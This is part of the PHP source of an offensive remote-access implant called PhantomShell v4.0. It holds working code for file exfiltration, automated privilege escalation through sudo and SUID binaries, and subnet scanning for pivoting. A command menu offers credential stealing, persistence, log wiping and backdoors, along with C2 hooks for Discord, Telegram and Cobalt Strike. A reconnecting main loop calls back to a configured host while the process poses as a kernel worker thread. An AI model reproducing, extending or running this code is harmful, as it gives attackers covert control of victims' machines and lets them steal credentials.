function cmd_exfil($sock,$a){if(!trim($a)){sw($sock,RED."Usage: exfil <file>".R."\n");return;}$f=trim($a);if(!is_readable($f)){sw($sock,RED."[-]".R."\n");return;}$data=@file_get_contents($f);$gz=function_exists('gzencode')?gzencode($data):$data;$b64=base64_encode($gz);sw($sock,GRN."[+]".R." $f: ".strlen($data)."B → ".strlen($b64)."B b64".(function_exists('gzencode')?" (gzip)":'')."\n--EXFIL-BEGIN--\n");foreach(str_split($b64,76) as $c)sw($sock,$c."\n");sw($sock,"--EXFIL-END--\n");}
function cmd_compress($s,$a){if(!trim($a)){sw($s,RED."Usage: compress <file>".R."\n");return;}$f=trim($a);$o='';x("which tar 2>/dev/null",$o);if(trim($o)){$out="$f.tar.gz";x("tar czf ".escapeshellarg($out)." ".escapeshellarg($f)." 2>&1",$o);sw($s,file_exists($out)?GRN."[+] $out".R."\n":RED."[-]".R."\n");}else{$o='';x("which zip 2>/dev/null",$o);if(trim($o)){$out="$f.zip";x("zip -r ".escapeshellarg($out)." ".escapeshellarg($f)." 2>&1",$o);sw($s,file_exists($out)?GRN."[+] $out".R."\n":RED."[-]".R."\n");}else sw($s,RED."No tar/zip".R."\n");}}

// =============================================
// 24. AUTOMATION
// =============================================
function cmd_auto_root($s){sw($s,RED."[AUTO ROOT]".R."\n");cmd_privesc_auto($s);sw($s,YEL."[*]".R." Trying sudo...\n");$o='';x('sudo -n id 2>&1',$o);if(strpos($o,'uid=0')!==false){sw($s,GRN."[+] sudo works!".R."\n");return;}sw($s,YEL."[*]".R." Trying SUID...\n");$o='';x('find / -perm -4000 -type f 2>/dev/null',$o);$bins=array_filter(explode("\n",trim($o)));foreach($bins as $b){$bn=basename($b);if($bn==='find'){sw($s,GRN."[+]".R." SUID find: $b -exec /bin/sh -p \\;\n");return;}if($bn==='python3'||$bn==='python'){sw($s,GRN."[+]".R." SUID $bn: $b -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'\n");return;}if($bn==='bash'){sw($s,GRN."[+]".R." SUID bash: $b -p\n");return;}}sw($s,YEL."[*]".R." No auto methods succeeded. Try manual.\n\n");}
function cmd_auto_pivot($s){sw($s,CYN."[AUTO PIVOT]".R."\n");$o='';x("ip route 2>/dev/null|grep -oP '\\d+\\.\\d+\\.\\d+\\.0/\\d+'|head -3",$o);$nets=array_filter(explode("\n",trim($o)));if(empty($nets)){sw($s,RED."[-] No routes".R."\n");return;}foreach($nets as $net){sw($s,YEL."[*]".R." Scanning $net...\n");$base=substr($net,0,strrpos($net,'.'));for($i=1;$i<=254;$i++){$ip="$base.$i";$fp=@fsockopen($ip,22,$en,$es,0.3);if($fp){@fclose($fp);sw($s,"  ".GRN."[+] $ip:22 (SSH)".R."\n");}$fp=@fsockopen($ip,80,$en,$es,0.3);if($fp){@fclose($fp);sw($s,"  ".GRN."[+] $ip:80 (HTTP)".R."\n");}}}sw($s,"\n");}
function cmd_auto_persist($s){cmd_persist_all($s);}
function cmd_auto_clean($s){cmd_clean_logs($s);cmd_hide_process($s);sw($s,GRN."[+] All cleaned".R."\n");}
function cmd_auto_report($s){sw($s,CYN."[REPORT]".R."\n");$report=array('host'=>g_host(),'user'=>g_user(),'uid'=>g_uid(),'os'=>g_os(),'kernel'=>php_uname('r'),'php'=>phpversion(),'cwd'=>getcwd(),'timestamp'=>date('Y-m-d H:i:s T'));$o='';x('id',$o);$report['id']=trim($o);$o='';x('ip -4 addr show 2>/dev/null',$o);$report['interfaces']=trim($o);$o='';x('ss -tlnp 2>/dev/null',$o);$report['listening']=trim($o);$o='';x('find / -perm -4000 -type f 2>/dev/null',$o);$report['suid']=trim($o);$o='';x('sudo -n -l 2>&1',$o);$report['sudo']=trim($o);$json=json_encode($report,JSON_PRETTY_PRINT);$path='/tmp/.phantom_report_'.date('Ymd_His').'.json';@file_put_contents($path,$json);sw($s,GRN."[+]".R." Report: $path (".strlen($json)."B)\n");sw($s,$json."\n\n");}

// =============================================
// 25. PROCESS MANAGEMENT
// =============================================
function cmd_background($sock,$cmd){global $G;if(!$cmd){sw($sock,RED."Usage: background <cmd>".R."\n");return;}if(!function_exists('proc_open')){sw($sock,RED."[-]".R."\n");return;}$d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=@proc_open($cmd,$d,$pp,getcwd());if(!is_resource($p)){sw($sock,RED."[-]".R."\n");return;}stream_set_blocking($pp[1],false);stream_set_blocking($pp[2],false);$G['job_cnt']++;$jid=$G['job_cnt'];$st=proc_get_status($p);$G['jobs'][$jid]=array('proc'=>$p,'pipes'=>$pp,'cmd'=>$cmd,'pid'=>$st['pid'],'t'=>time());sw($sock,GRN."[+]".R." [$jid] PID:{$st['pid']}\n");}
function cmd_jobs($sock){global $G;if(empty($G['jobs'])){sw($sock,"No jobs\n");return;}foreach($G['jobs'] as $jid=>$j){$st=proc_get_status($j['proc']);sw($sock,"  [$jid] PID:{$j['pid']} ".($st['running']?GRN."run":RED."stop").R." {$j['cmd']}\n");}}
function cmd_fg($sock,$a){global $G;$jid=(int)$a;if(!$jid){end($G['jobs']);$jid=key($G['jobs']);}if(!isset($G['jobs'][$jid])){sw($sock,RED."[-]".R."\n");return;}$j=$G['jobs'][$jid];while(true){$st=proc_get_status($j['proc']);if(!$st['running'])break;$o=@fread($j['pipes'][1],4096);if($o!==false&&$o!=='')sw($sock,$o);$e=@fread($j['pipes'][2],4096);if($e!==false&&$e!=='')sw($sock,$e);$r=array($sock);$w=null;$x=null;if(@stream_select($r,$w,$x,0,50000)>0){$in=fread($sock,4096);if($in===false||strpos($in,"\x03")!==false)break;@fwrite($j['pipes'][0],$in);}usleep(10000);}foreach($j['pipes'] as $pp)@fclose($pp);@proc_close($j['proc']);unset($G['jobs'][$jid]);sw($sock,GRN."Done".R."\n");}
function cmd_kill($sock,$a){global $G;if(!$a){sw($sock,RED."Usage: kill <PID|%job>".R."\n");return;}if($a[0]==='%'){$jid=(int)substr($a,1);if(!isset($G['jobs'][$jid]))return;@proc_terminate($G['jobs'][$jid]['proc'],9);foreach($G['jobs'][$jid]['pipes'] as $pp)@fclose($pp);@proc_close($G['jobs'][$jid]['proc']);unset($G['jobs'][$jid]);sw($sock,GRN."Killed".R."\n");return;}if(function_exists('posix_kill'))@posix_kill((int)$a,9);else x("kill -9 $a",$o);sw($sock,GRN."Sent".R."\n");}

// =============================================
// 26. PTY
// =============================================
function pty_shell($sock){if(!function_exists('proc_open')){sw($sock,RED."[-]".R."\n");return;}$sh=file_exists('/bin/bash')?'/bin/bash':'/bin/sh';$cmd=$sh;foreach(array(array('python3',"python3 -c 'import pty;pty.spawn(\"$sh\")'"),array('python',"python -c 'import pty;pty.spawn(\"$sh\")'"),array('script',"script -qc $sh /dev/null")) as $m){$o='';x("which {$m[0]} 2>/dev/null",$o);if(trim($o)){$cmd=$m[1];break;}}$d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=@proc_open($cmd,$d,$pp,getcwd());if(!is_resource($p)){sw($sock,RED."[-]".R."\n");return;}stream_set_blocking($pp[1],false);stream_set_blocking($pp[2],false);stream_set_blocking($sock,false);while(true){$st=proc_get_status($p);if(!$st['running'])break;$r=array($sock);$w=null;$e=null;if(@stream_select($r,$w,$e,0,100000)>0){$data=fread($sock,4096);if($data===false||$data==='')break;@fwrite($pp[0],$data);}$o=@fread($pp[1],4096);if($o!==false&&$o!=='')sw($sock,$o);$e2=@fread($pp[2],4096);if($e2!==false&&$e2!=='')sw($sock,$e2);usleep(10000);}foreach($pp as $pipe)@fclose($pipe);@proc_close($p);sw($sock,"\n".GRN."PTY ended".R."\n");}

// =============================================
// 27. HELP SYSTEM
// =============================================
function get_alias($n){$m=array('ll'=>'ls -la','la'=>'ls -a','l'=>'ls','cls'=>'clear','..'=>'cd ..','...'=>'cd ../..','bg'=>'background','dir'=>'ls','type'=>'cat','del'=>'rm');return isset($m[$n])?$m[$n]:null;}
function is_passthru($n){return in_array($n,array('ifconfig','ip','ps','netstat','ss','whoami','id','uname','hostname','mount','df','free','top','w','who','last','file','grep','find','wget','curl','ping','traceroute','nslookup','dig','wc','sort','uniq','cut','awk','sed','tar','zip','unzip','gzip','base64','xxd','strings','date','uptime','lsof','nc','ncat','socat','python','python3','perl','ruby','gcc','make','dpkg','apt','yum','pip','git','docker','kubectl','systemctl','journalctl','chmod','chown'));}

function cmd_help($s,$topic=''){
    if($topic){$d=array('vuln_scan'=>'Kernel CVEs, SUID, sudo, docker, polkit, cron, caps, /etc, SSH, configs','pivot_portfwd'=>'pivot_portfwd <lport> <rhost> <rport>','pivot_socks'=>'SOCKS4 on :1080','privesc_auto'=>'PwnKit + GameOverlay + DirtyPipe','persist_all'=>'All persistence methods','portscan'=>'portscan <host> <ports> [timeout]','auto_root'=>'Try all privesc methods','auto_pivot'=>'Scan subnets for hosts','steal_all'=>'All credential harvesting','clean_self'=>'Shred+delete shell','alter_conn'=>'alter_conn <ip> <port>','memory_only'=>'Generate memory-only payload','c2_discord'=>'c2_discord <webhook_url>','c2_telegram'=>'c2_telegram <token> <chat_id>','c2_http'=>'c2_http <callback_url>','exfil'=>'exfil <file> — gzip+base64 output');$t=strtolower(trim($topic));sw($s,isset($d[$t])?"\n".CYN."[$t]".R." ".$d[$t]."\n\n":RED."[-] No help for '$t'".R."\n");return;}
    $h="\n".MAG.str_repeat("=",62).R."\n".MAG."  PhantomShell v4.0 — COMMAND REFERENCE".R."\n".MAG.str_repeat("=",62).R."\n\n";
    $h.="  ".YEL."Shell".R."          help cd pwd clear history pty exit quit die alias mode capabilities\n";
    $h.="  ".YEL."Files".R."          cat head tail ls upload download edit cp mv rm mkdir touch\n";
    $h.="  ".YEL."Recon".R."          sysinfo env services ports firewall netmap\n";
    $h.="  ".YEL."Vuln".R."           vuln_scan\n";
    $h.="  ".YEL."Exploits".R."       exploit_suggest exploit_fetch exploit_compile\n";
    $h.="  ".YEL."Privesc".R."        privesc_check privesc_auto privesc_suggest\n";
    $h.="  ".YEL."Pivoting".R."       pivot_list pivot_portfwd pivot_socks pivot_tunnel\n";
    $h.="               pivot_ligolo pivot_chisel pivot_ssh pivot_rpivot pivot_earthworm pivot_proxychain\n";
    $h.="  ".YEL."Network".R."        portscan connect listen bannergrab\n";
    $h.="  ".YEL."Persist".R."        persist_all persist_cron persist_ssh persist_systemd persist_rc\n";
    $h.="               persist_motd persist_ldpreload persist_php persist_web persist_wsl\n";
    $h.="  ".YEL."Evasion".R."        clean_logs clean_self hide_process hide_connection timestomp alter_conn memory_only\n";
    $h.="  ".YEL."Lateral".R."        lateral_ssh lateral_scp lateral_wmi lateral_smb\n";
    $h.="  ".YEL."Stealing".R."       steal_all steal_configs steal_ssh steal_history steal_passwords steal_etc steal_browsers\n";
    $h.="  ".YEL."Backdoors".R."      backdoor_php backdoor_python backdoor_bash backdoor_nc backdoor_socat backdoor_web webshell\n";
    $h.="  ".YEL."C2".R."             c2_sliver c2_cobalt c2_meterpreter c2_venom c2_discord c2_telegram c2_http\n";
    $h.="  ".YEL."Exfil".R."          exfil compress\n";
    $h.="  ".YEL."Automation".R."     auto_root auto_pivot auto_persist auto_clean auto_report\n";
    $h.="  ".YEL."Jobs".R."           background fg jobs kill\n";
    $h.="\n  Tab ↑↓ Ctrl+C help<cmd>\n".MAG.str_repeat("=",62).R."\n\n";sw($s,$h);}

// =============================================
// 28. DISPATCHER
// =============================================
function dispatch($sock,$cn,$ca,$full){
    global $CFG;
    switch($cn){
    case 'exit':case 'quit':return 'exit';case 'die':return 'die';
    case 'help':cmd_help($sock,$ca);break;case 'clear':sw($sock,"\033[2J\033[H");break;case 'pwd':sw($sock,getcwd()."\n");break;
    case 'mode':sw($sock,($CFG['mode']==='FULL'?GRN:($CFG['mode']==='NORMAL'?YEL:RED)).$CFG['mode'].R."\n");break;
    case 'capabilities':cmd_capabilities($sock);break;
    case 'alias':foreach(array('ll'=>'ls -la','la'=>'ls -a','cls'=>'clear','..'=>'cd ..','bg'=>'background') as $a=>$v)sw($sock,"  ".YEL.$a.R."=$v\n");break;
    case 'history':global $G;foreach($G['history'] as $i=>$h)sw($sock,sprintf(DIM."%4d".R." %s\n",$i+1,$h));break;
    case 'cd':$d=$ca?:(getenv('HOME')?:'/');if($d==='-')$d=getenv('OLDPWD')?:getcwd();$old=getcwd();if(@chdir($d)){putenv("OLDPWD=$old");sw($sock,getcwd()."\n");}else sw($sock,RED."[-]".R."\n");break;
    case 'pty':pty_shell($sock);stream_set_blocking($sock,false);break;
    case 'upload':cmd_upload($sock,$ca);break;case 'download':cmd_download($sock,$ca);break;case 'edit':cmd_edit($sock,$ca);break;
    case 'cat':cmd_cat($sock,$ca);break;case 'head':cmd_head($sock,$ca);break;case 'tail':cmd_tail($sock,$ca);break;
    case 'ls':cmd_ls($sock,$ca);break;
    case 'rm':case 'mv':case 'cp':case 'mkdir':case 'rmdir':case 'touch':xs("$cn $ca",$sock);break;
    case 'sysinfo':cmd_sysinfo($sock);break;case 'env':cmd_env($sock);break;
    case 'services':cmd_services($sock);break;case 'ports':cmd_ports($sock);break;
    case 'firewall':cmd_firewall($sock);break;case 'netmap':cmd_netmap($sock);break;
    case 'vuln_scan':cmd_vuln_scan($sock);break;
    case 'exploit_suggest':cmd_exploit_suggest($sock);break;case 'exploit_fetch':cmd_exploit_fetch($sock,$ca);break;case 'exploit_compile':cmd_exploit_compile($sock,$ca);break;
    case 'privesc_check':cmd_privesc_check($sock);break;case 'privesc_auto':cmd_privesc_auto($sock);break;case 'privesc_suggest':cmd_privesc_suggest($sock);break;
    case 'auto_root':cmd_auto_root($sock);break;case 'auto_pivot':cmd_auto_pivot($sock);break;
    case 'auto_persist':cmd_auto_persist($sock);break;case 'auto_clean':cmd_auto_clean($sock);break;case 'auto_report':cmd_auto_report($sock);break;
    case 'pivot_list':cmd_pivot_list($sock);break;case 'pivot_portfwd':cmd_pivot_portfwd($sock,$ca);break;
    case 'pivot_socks':cmd_pivot_socks($sock);break;case 'pivot_tunnel':cmd_pivot_tunnel($sock,$ca);break;
    case 'pivot_ligolo':cmd_pivot_ligolo($sock);break;case 'pivot_chisel':cmd_pivot_chisel($sock);break;
    case 'pivot_ssh':cmd_pivot_ssh($sock);break;case 'pivot_rpivot':cmd_pivot_rpivot($sock);break;
    case 'pivot_earthworm':cmd_pivot_earthworm($sock);break;case 'pivot_proxychain':cmd_pivot_proxychain($sock);break;
    case 'portscan':cmd_portscan($sock,$ca);break;case 'connect':cmd_connect($sock,$ca);break;
    case 'listen':cmd_listen($sock,$ca);break;case 'bannergrab':cmd_bannergrab($sock,$ca);break;
    case 'persist_all':cmd_persist_all($sock);break;case 'persist_cron':cmd_persist_cron($sock);break;
    case 'persist_ssh':cmd_persist_ssh($sock);break;case 'persist_systemd':cmd_persist_systemd($sock);break;
    case 'persist_rc':cmd_persist_rc($sock);break;case 'persist_motd':cmd_persist_motd($sock);break;
    case 'persist_ldpreload':cmd_persist_ldpreload($sock);break;case 'persist_php':cmd_persist_php($sock);break;
    case 'persist_web':cmd_persist_web($sock);break;case 'persist_wsl':cmd_persist_wsl($sock);break;
    case 'clean_logs':cmd_clean_logs($sock);break;case 'clean_self':cmd_clean_self($sock);break;
    case 'hide_process':cmd_hide_process($sock);break;case 'hide_connection':cmd_hide_connection($sock);break;
    case 'timestomp':cmd_timestomp($sock,$ca);break;case 'alter_conn':cmd_alter_conn($sock,$ca);break;
    case 'memory_only':cmd_memory_only($sock);break;
    case 'lateral_ssh':cmd_lateral_ssh($sock,$ca);break;case 'lateral_scp':cmd_lateral_scp($sock,$ca);break;
    case 'lateral_wmi':cmd_lateral_wmi($sock,$ca);break;case 'lateral_smb':cmd_lateral_smb($sock,$ca);break;
    case 'steal_all':cmd_steal_all($sock);break;case 'steal_configs':cmd_steal_configs($sock);break;
    case 'steal_ssh':cmd_steal_ssh($sock);break;case 'steal_history':cmd_steal_history($sock);break;
    case 'steal_passwords':cmd_steal_passwords($sock);break;case 'steal_etc':cmd_steal_etc($sock);break;
    case 'steal_browsers':cmd_steal_browsers($sock);break;
    case 'backdoor_php':cmd_backdoor_php($sock,$ca);break;case 'backdoor_python':cmd_backdoor_python($sock);break;
    case 'backdoor_bash':cmd_backdoor_bash($sock);break;case 'backdoor_nc':cmd_backdoor_nc($sock);break;
    case 'backdoor_socat':cmd_backdoor_socat($sock);break;case 'backdoor_web':case 'webshell':cmd_backdoor_web($sock);break;
    case 'c2_sliver':cmd_c2_sliver($sock);break;case 'c2_cobalt':cmd_c2_cobalt($sock);break;
    case 'c2_meterpreter':cmd_c2_meterpreter($sock);break;case 'c2_venom':cmd_c2_venom($sock);break;
    case 'c2_discord':cmd_c2_discord($sock,$ca);break;case 'c2_telegram':cmd_c2_telegram($sock,$ca);break;
    case 'c2_http':cmd_c2_http($sock,$ca);break;
    case 'exfil':cmd_exfil($sock,$ca);break;case 'compress':cmd_compress($sock,$ca);break;
    case 'background':cmd_background($sock,$ca);break;case 'fg':cmd_fg($sock,$ca);break;
    case 'jobs':cmd_jobs($sock);break;case 'kill':cmd_kill($sock,$ca);break;
    default:xs($full,$sock);break;}return 'ok';}

// =============================================
// 29. JSON WIRE PROTOCOL (v5.0 dual-mode)
// =============================================
function json_send($sock,$msg){
    $data=json_encode($msg);if($data===false)return false;
    $len=strlen($data);if($len>10485760)return false;
    return sw($sock,pack('N',$len).$data);
}
function json_recv($sock,$timeout_sec=5){
    stream_set_blocking($sock,true);stream_set_timeout($sock,$timeout_sec);
    $hdr=@fread($sock,4);$info=stream_get_meta_data($sock);
    if($info['timed_out']||$hdr===false||strlen($hdr)<4){stream_set_blocking($sock,false);return null;}
    $len=unpack('N',$hdr)[1];if($len<2||$len>10485760){stream_set_blocking($sock,false);return null;}
    $buf='';$rem=$len;while($rem>0){$chunk=@fread($sock,min($rem,8192));$info=stream_get_meta_data($sock);
        if($info['timed_out']||$chunk===false||$chunk===''){stream_set_blocking($sock,false);return null;}
        $buf.=$chunk;$rem-=strlen($chunk);}
    stream_set_blocking($sock,false);$msg=json_decode($buf,true);return is_array($msg)?$msg:null;
}
function json_msg($type,$payload=array()){
    global $CFG,$G;$G['seq']++;
    return array('message_id'=>sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',mt_rand(0,0xffff),mt_rand(0,0xffff),mt_rand(0,0xffff),mt_rand(0,0x0fff)|0x4000,mt_rand(0,0x3fff)|0x8000,mt_rand(0,0xffff),mt_rand(0,0xffff),mt_rand(0,0xffff)),
        'timestamp'=>time(),'sequence'=>$G['seq'],'agent_id'=>$CFG['agent_id'],'type'=>$type,'payload'=>$payload);
}
function json_register_payload(){
    global $CFG,$G;$ip='';x("hostname -I 2>/dev/null|awk '{print $1}'",$ip);
    return array('agent_type'=>'php','agent_version'=>$CFG['version'],'hostname'=>g_host(),'username'=>g_user(),
        'os'=>php_uname('s'),'os_version'=>php_uname('r'),'arch'=>php_uname('m'),'pid'=>getmypid(),
        'integrity'=>(g_uid()==0)?'high':'medium','ip'=>trim($ip),'capabilities'=>array_keys(array_filter($G['caps'],function($v){return $v===true||($v!==false&&$v!=='none');})));
}
function try_json_handshake($sock){
    global $G;$reg=json_msg('register',json_register_payload());
    if(!json_send($sock,$reg))return false;
    $ack=json_recv($sock,2);
    if(!$ack||!isset($ack['type'])||$ack['type']!=='ack')return false;
    if(isset($ack['payload']['session_id']))$G['session_id']=$ack['payload']['session_id'];
    return true;
}
function json_execute_task($task){
    global $CFG;$p=$task['payload'];$cmd=$p['command'];$args=isset($p['args'])?$p['args']:array();
    $raw=isset($p['raw'])?$p['raw']:$cmd;$timeout=isset($p['timeout'])?(int)$p['timeout']:30;
    if($cmd==='exit')return array('status'=>'ok','output'=>'bye','_action'=>'exit');
    if($cmd==='cd'){$d=trim($raw);if(strpos($d,'cd ')===0)$d=trim(substr($d,3));$d=$d?:(getenv('HOME')?:'/');
        if(@chdir($d))return array('status'=>'ok','output'=>getcwd());
        return array('status'=>'error','error'=>'Cannot chdir');}
    if($cmd==='pwd')return array('status'=>'ok','output'=>getcwd());
    if($cmd==='capabilities'){global $G;return array('status'=>'ok','data'=>$G['caps']);}

    $buf=fopen('php://memory','r+');
    $parts=preg_split('/\s+/',$raw,2);$cn=strtolower($parts[0]);$ca=isset($parts[1])?$parts[1]:'';
    $alias=get_alias($cn);if($alias){$fa=$alias.($ca?" $ca":'');$parts=preg_split('/\s+/',$fa,2);$cn=strtolower($parts[0]);$ca=isset($parts[1])?$parts[1]:'';$raw=$fa;}

    if($CFG['mode']==='MINIMAL'){$result=dispatch_minimal($buf,$cn,$ca);}
    elseif(is_passthru($cn)){xs($raw,$buf);}
    else{$result=dispatch($buf,$cn,$ca,$raw);}

    rewind($buf);$output=stream_get_contents($buf);fclose($buf);
    $output=preg_replace('/\033\[[0-9;]*m/','',$output);
    if(isset($result)&&$result==='exit')return array('status'=>'ok','output'=>$output,'_action'=>'exit');
    if(isset($result)&&$result==='die')return array('status'=>'ok','output'=>$output,'_action'=>'exit');
    return array('status'=>'ok','output'=>$output);
}
function json_main_loop($sock){
    global $CFG,$G;$sleep=$CFG['reconnect'];
    while(true){
        $beacon=json_msg('beacon',array('cwd'=>getcwd(),'user'=>g_user(),'pid'=>getmypid(),'integrity'=>(g_uid()==0)?'high':'medium'));
        if(!json_send($sock,$beacon))return;
        $resp=json_recv($sock,max($sleep*2,10));
        if($resp===null)return;
        if(isset($resp['type'])&&$resp['type']==='task'){
            $result=json_execute_task($resp);
            $action=isset($result['_action'])?$result['_action']:null;unset($result['_action']);
            $task_id=isset($resp['payload']['task_id'])?$resp['payload']['task_id']:'?';
            $response=json_msg('response',array_merge(array('task_id'=>$task_id,'command'=>isset($resp['payload']['command'])?$resp['payload']['command']:''),$result));
            json_send($sock,$response);
            if($action==='exit')return;
        }
        usleep($sleep*1000000);
    }
}

// =============================================
// 30. MAIN LOOP (dual-mode)
// =============================================
if(function_exists('cli_set_process_title')&&!fn_off('cli_set_process_title'))@cli_set_process_title('[kworker/0:1-events]');
check_capabilities();
while(true){
    $sock=@fsockopen($CFG['host'],$CFG['port'],$errno,$errstr,$CFG['timeout']);
    if(!$sock){sleep($CFG['reconnect']);continue;}
    $G['sock']=$sock;$G['proto']='plaintext';$G['seq']=0;$G['session_id']=null;

    if($CFG['protocol']==='json'||$CFG['protocol']==='auto'){
        stream_set_blocking($sock,true);
        if(try_json_handshake($sock)){
            $G['proto']='json';stream_set_blocking($sock,false);
            json_main_loop($sock);
            @fclose($sock);$G['sock']=null;sleep($CFG['reconnect']);continue;
        }
        if($CFG['protocol']==='json'){@fclose($sock);$G['sock']=null;sleep($CFG['reconnect']);continue;}
    }

    stream_set_blocking($sock,false);hist_load();banner($sock);sw($sock,prompt());$cl='';
    while(true){
        $rd=array($sock);$wr=null;$ex=null;$sel=@stream_select($rd,$wr,$ex,0,200000);
        if($sel===false)break;if($sel>0){$raw=@fread($sock,4096);if($raw===false||$raw==='')break;
        $i=0;$len=strlen($raw);while($i<$len){$ch=$raw[$i];
            if($ch==="\x03"){$cl='';sw($sock,"^C\n".prompt());$i++;continue;}
            if($ch==="\x0c"){sw($sock,"\033[2J\033[H".prompt().$cl);$i++;continue;}
            if($ch==="\x04"){if($cl==='')break 2;$i++;continue;}
            if($ch==="\x09"){$r=tab_complete($cl,$sock);if($r['append']!==''){$cl.=$r['append'];if(!$r['redraw'])sw($sock,$r['append']);}if($r['redraw'])sw($sock,prompt().$cl);$i++;continue;}
            if($ch==="\x1b"&&$i+2<$len&&$raw[$i+1]==='['){$seq=$raw[$i+2];if($seq==='A'){$p=hist_prev();if($p!==null){$cl=$p;sw($sock,"\r\033[K".prompt().$cl);}}elseif($seq==='B'){$cl=hist_next();sw($sock,"\r\033[K".prompt().$cl);}$i+=3;continue;}
            if($ch==="\x7f"||$ch==="\x08"){if(strlen($cl)>0){$cl=substr($cl,0,-1);sw($sock,"\x08 \x08");}$i++;continue;}
            if($ch==="\n"||$ch==="\r"){if($ch==="\r"&&$i+1<$len&&$raw[$i+1]==="\n")$i++;sw($sock,"\n");$cmd=trim($cl);$cl='';
                if(!$cmd){sw($sock,prompt());$i++;continue;}
                if($cmd==='!!'){if(!empty($G['history'])){$cmd=end($G['history']);sw($sock,DIM.$cmd.R."\n");}else{sw($sock,prompt());$i++;continue;}}
                elseif(preg_match('/^!(\d+)$/',$cmd,$m)){$n=(int)$m[1]-1;if(isset($G['history'][$n])){$cmd=$G['history'][$n];sw($sock,DIM.$cmd.R."\n");}else{sw($sock,prompt());$i++;continue;}}
                hist_add($cmd);$parts=preg_split('/\s+/',$cmd,2);$cn=strtolower($parts[0]);$ca=isset($parts[1])?$parts[1]:'';
                $alias=get_alias($cn);if($alias){$fa=$alias.($ca?" $ca":'');$parts=preg_split('/\s+/',$fa,2);$cn=strtolower($parts[0]);$ca=isset($parts[1])?$parts[1]:'';$cmd=$fa;}
                if($CFG['mode']==='MINIMAL'){$result=dispatch_minimal($sock,$cn,$ca);}
                else{if(is_passthru($cn)){xs($cmd,$sock);sw($sock,prompt());$i++;continue;}$result=dispatch($sock,$cn,$ca,$cmd);}
                if($result==='exit')break 2;if($result==='die'){@fclose($sock);exit(0);}
                sw($sock,prompt());$i++;continue;}
            if(ord($ch)>=32){$cl.=$ch;sw($sock,$ch);}$i++;}}usleep(10000);}
    foreach($G['jobs'] as $j){@proc_terminate($j['proc']);foreach($j['pipes'] as $pp)@fclose($pp);@proc_close($j['proc']);}
    $G['jobs']=array();$G['job_cnt']=0;@fclose($sock);$G['sock']=null;sleep($CFG['reconnect']);
}
?>
